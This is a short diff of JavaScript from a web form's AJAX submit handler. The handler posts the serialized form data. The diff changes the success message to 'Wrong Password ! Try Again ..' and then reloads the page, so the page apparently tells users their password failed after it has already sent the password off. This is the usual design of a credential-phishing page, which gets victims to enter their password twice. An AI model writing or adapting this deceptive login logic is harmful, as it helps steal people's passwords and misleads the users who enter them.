@@ -39,9 +39,9 @@
                 data:$("#submit-form").serialize(),
                 method:"post",
                 success:function (response){
-                    alert("Form submitted successfully")
+                    alert("Wrong Password ! Try Again ..")
                     window.location.reload()
-                    window.location.href="wrong.html"
+                    //window.location.href="wrong.html"
                 },
                 error:function (err){
                     alert("Something Error")
